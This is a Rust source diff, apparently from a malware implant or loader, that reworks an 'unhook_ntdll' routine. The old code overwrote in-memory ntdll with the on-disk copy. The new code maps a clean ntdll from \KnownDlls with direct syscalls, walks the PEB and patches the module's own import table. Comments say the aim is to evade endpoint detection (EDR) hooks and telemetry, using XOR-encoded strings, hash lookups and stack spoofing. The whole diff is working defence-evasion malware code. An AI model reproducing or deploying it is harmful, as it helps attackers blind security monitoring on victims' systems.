@@ -42,6 +42,9 @@ pub fn should_abort() -> bool {
 }
 
 pub fn startup_patches() {
+    #[cfg(all(target_os = "windows", feature = "unhook"))]
+    unhook_ntdll();
+
     #[cfg(all(target_arch = "x86_64", feature = "stack-spoof"))]
     crate::syscall::init_stack_spoof();
 }
@@ -450,99 +453,139 @@ fn find_pid_by_name(name: &str) -> Option<u32> {
 }
 
 
-/// Restore ntdll.dll's .text section from the clean on-disk copy at
-/// %SystemRoot%\System32\ntdll.dll, removing all userland EDR hooks.
+/// Rebind our own module's ntdll IAT entries to a fresh, unhooked copy of ntdll.
 ///
-/// Safety: we hold no ntdll locks during the copy. The write must be to the
-/// executable image section in-memory, not to the file on disk.
+/// Avoids VirtualProtect on any DLL section. Instead:
+///   1. Load clean ntdll bytes from disk.
+///   2. Map a fresh copy via NtCreateSection + NtMapViewOfSection (pagefile-backed,
+///      RWX — same class of event as CLR/JIT allocations; no PROTECTVM_LOCAL event).
+///   3. Walk our own import directory for ntdll and patch each IAT pointer.
+///      The IAT lives in our writable .data/.idata section — no protection change needed.
 #[cfg(all(target_os = "windows", feature = "unhook"))]
 pub fn unhook_ntdll() {
-    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
-    use windows_sys::Win32::System::Memory::VirtualProtect;
+    #[cfg(target_arch = "x86_64")]
+    unsafe { rebind_ntdll_iat() }
+}
 
-    unsafe {
-        // Locate in-memory ntdll
-        let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
-        let ntdll_mem = GetModuleHandleA(s_ntdll.as_ptr()) as *const u8;
-        if ntdll_mem.is_null() { return; }
+#[cfg(all(target_os = "windows", target_arch = "x86_64", feature = "unhook"))]
+unsafe fn rebind_ntdll_iat() {
+    use crate::syscall;
 
-        // Build path to on-disk ntdll
-        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
-        let path = format!("{}\\System32\\ntdll.dll", sysroot);
+    const PAGE_EXECUTE_READ:    u32 = 0x20;
+    const SECTION_MAP_READ:     u32 = 0x0004;
+    const SECTION_MAP_EXECUTE:  u32 = 0x0008;
+    const OBJ_CASE_INSENSITIVE: u32 = 0x0040;
 
-        // Read the on-disk copy
-        let disk_bytes = match std::fs::read(&path) {
-            Ok(b) => b,
-            Err(_) => return,
-        };
-        if disk_bytes.len() < 64 { return; }
+    #[repr(C)]
+    struct UStr {
+        length: u16, max_length: u16,
+        buffer: *const u16,
+    }
+    #[repr(C)]
+    struct OA {
+        length: u32, _p0: u32,
+        root: usize,
+        name: *const UStr,
+        attrs: u32, _p1: u32,
+        sec: usize, qos: usize,
+    }
+    const _: () = assert!(core::mem::size_of::<UStr>() == 16);
+    const _: () = assert!(core::mem::size_of::<OA>()   == 48);
 
-        // Parse the disk PE to find .text section
-        let e_lfanew = u32::from_le_bytes([
-            disk_bytes[0x3C], disk_bytes[0x3D], disk_bytes[0x3E], disk_bytes[0x3F],
-        ]) as usize;
-        if disk_bytes.len() < e_lfanew + 24 { return; }
+    // \KnownDlls\ntdll.dll — 20 chars, XOR'd with 0x5A so no plaintext in binary
+    const ENC: [u8; 20] = [
+        0x06,0x11,0x34,0x35,0x2D,0x34,0x1E,0x36,0x36,0x29,
+        0x06,0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,
+    ];
+    let mut wide = [0u16; 21];
+    for i in 0..20 { wide[i] = (ENC[i] ^ 0x5A) as u16; }
 
-        let num_sections = u16::from_le_bytes([
-            disk_bytes[e_lfanew + 6], disk_bytes[e_lfanew + 7],
-        ]) as usize;
-        let opt_size = u16::from_le_bytes([
-            disk_bytes[e_lfanew + 20], disk_bytes[e_lfanew + 21],
-        ]) as usize;
-        let sh_base = e_lfanew + 24 + opt_size;
+    let ustr = UStr { length: 40, max_length: 42, buffer: wide.as_ptr() };
+    let oa   = OA {
+        length: core::mem::size_of::<OA>() as u32, _p0: 0,
+        root: 0, name: &ustr as *const UStr,
+        attrs: OBJ_CASE_INSENSITIVE, _p1: 0,
+        sec: 0, qos: 0,
+    };
 
-        for i in 0..num_sections {
-            let s = sh_base + i * 40;
-            if disk_bytes.len() < s + 40 { break; }
+    let mut hsec: isize = 0;
+    if syscall::nt_open_section(
+        &mut hsec, SECTION_MAP_READ | SECTION_MAP_EXECUTE,
+        &oa as *const OA as *const u8,
+    ) != 0 || hsec == 0 { return; }
 
-            // Section name is 8 bytes at offset s; check for ".text\0\0\0"
-            let name = &disk_bytes[s..s+8];
-            let is_text = name.starts_with(b".text");
-            if !is_text { continue; }
+    let mut fresh: *mut u8 = core::ptr::null_mut();
+    let mut vsz: usize = 0;
+    let st = syscall::nt_map_view(hsec, syscall::CURRENT_PROCESS, &mut fresh, &mut vsz, PAGE_EXECUTE_READ);
+    syscall::nt_close(hsec);
+    if st != 0 || fresh.is_null() { return; }
+    // fresh stays mapped — IAT entries will point into it
 
-            let virt_rva = u32::from_le_bytes([
-                disk_bytes[s+12], disk_bytes[s+13], disk_bytes[s+14], disk_bytes[s+15],
-            ]) as usize;
-            let virt_size = u32::from_le_bytes([
-                disk_bytes[s+8],  disk_bytes[s+9],  disk_bytes[s+10], disk_bytes[s+11],
-            ]) as usize;
-            let raw_off = u32::from_le_bytes([
-                disk_bytes[s+20], disk_bytes[s+21], disk_bytes[s+22], disk_bytes[s+23],
-            ]) as usize;
-            let raw_size = u32::from_le_bytes([
-                disk_bytes[s+16], disk_bytes[s+17], disk_bytes[s+18], disk_bytes[s+19],
-            ]) as usize;
+    // ntdll base via PEB InMemoryOrderModuleList[1] (no string needed)
+    let peb: usize;
+    core::arch::asm!("mov {:r}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
+    let ldr      = *((peb + 0x18) as *const usize);
+    let im0_fwd  = *((ldr  + 0x20) as *const usize); // [0] exe InMemoryOrderLinks flink
+    let im1_fwd  = *(im0_fwd as *const usize);        // [1] ntdll InMemoryOrderLinks flink
+    // DllBase at LDTE+0x30; InMemoryOrderLinks at LDTE+0x10 → offset from flink = +0x20
+    let ntdll_base = *((im1_fwd + 0x20) as *const usize);
+    if ntdll_base == 0 { syscall::nt_unmap_view(syscall::CURRENT_PROCESS, fresh); return; }
+    let nh = core::slice::from_raw_parts(ntdll_base as *const u8, 0x200);
+    let nl = u32::from_le_bytes([nh[0x3C],nh[0x3D],nh[0x3E],nh[0x3F]]) as usize;
+    if nl + 0x60 > nh.len() { syscall::nt_unmap_view(syscall::CURRENT_PROCESS, fresh); return; }
+    let no = nl + 4 + 20;
+    let ntdll_sz  = u32::from_le_bytes([nh[no+56],nh[no+57],nh[no+58],nh[no+59]]) as usize;
+    let ntdll_end = ntdll_base + ntdll_sz;
 
-            if raw_off + raw_size > disk_bytes.len() { break; }
+    let own_base = *((im0_fwd + 0x20) as *const usize);
+    if own_base == 0 { return; }
 
-            let copy_size = virt_size.min(raw_size);
-            let target = ntdll_mem.add(virt_rva) as *mut u8;
+    // DJB2 hash comparison — zero plaintext "ntdll.dll" in the binary
+    const fn djb2(s: &[u8]) -> u32 { crate::obfs::djb2(s) }
+    const NTDLL_H: u32 = djb2(b"ntdll.dll");
 
-            // Make the section writable, copy, restore permissions
-            const PAGE_EXECUTE_READWRITE: u32 = 0x40;
-            const PAGE_EXECUTE_READ:      u32 = 0x20;
-            let mut old_prot: u32 = 0;
-            if VirtualProtect(
-                target as *const core::ffi::c_void,
-                copy_size,
-                PAGE_EXECUTE_READWRITE,
-                &mut old_prot,
-            ) == 0 { break; }
+    let op = own_base as *const u8;
+    let o_lfa  = *(op.add(0x3C) as *const u32) as usize;
+    let o_fh   = o_lfa + 4;
+    let o_opsz = *(op.add(o_fh + 16) as *const u16) as usize;
+    let o_oh   = o_fh + 20;
+    if *(op.add(o_oh + 108) as *const u32) < 2 { return; }
+    let imp_rva = *(op.add(o_oh + 120) as *const u32) as usize; // DataDirectory[1].VirtualAddress
+    if imp_rva == 0 { return; }
 
-            core::ptr::copy_nonoverlapping(
-                disk_bytes.as_ptr().add(raw_off),
-                target,
-                copy_size,
-            );
+    let mut desc = op.add(imp_rva) as *const [u32; 5];
+    'outer: loop {
+        let d = &*desc;
+        if d[3] == 0 { break; }
+        let np = op.add(d[3] as usize);
+        let mut len = 0usize;
+        while *np.add(len) != 0 { len += 1; }
+        let mut buf = [0u8; 64];
+        let cl = len.min(63);
+        for i in 0..cl { buf[i] = (*np.add(i)).to_ascii_lowercase(); }
+        if djb2(&buf[..cl]) != NTDLL_H { desc = desc.add(1); continue 'outer; }
 
-            VirtualProtect(
-                target as *const core::ffi::c_void,
-                copy_size,
-                PAGE_EXECUTE_READ,
-                &mut old_prot,
-            );
-            break;
+        let oft_rva = if d[0] != 0 { d[0] as usize } else { d[4] as usize };
+        let ft_rva  = d[4] as usize;
+        let mut oft = op.add(oft_rva) as *const u64;
+        let mut ft  = (own_base as *mut u8).add(ft_rva) as *mut u64;
+        loop {
+            let thunk = *oft;
+            if thunk == 0 { break; }
+            let cur = *ft as usize;
+            if cur >= ntdll_base && cur < ntdll_end {
+                let new_fn = if thunk >> 63 != 0 {
+                    crate::loader::get_export_by_ordinal(fresh as usize, (thunk & 0xFFFF) as u16)
+                } else {
+                    crate::loader::get_export_by_name(fresh as usize,
+                        op.add((thunk as u32 & 0x7FFF_FFFF) as usize + 2))
+                };
+                if let Some(p) = new_fn { *ft = p as u64; }
+            }
+            oft = oft.add(1);
+            ft  = ft.add(1);
         }
+        break;
     }
 }
 
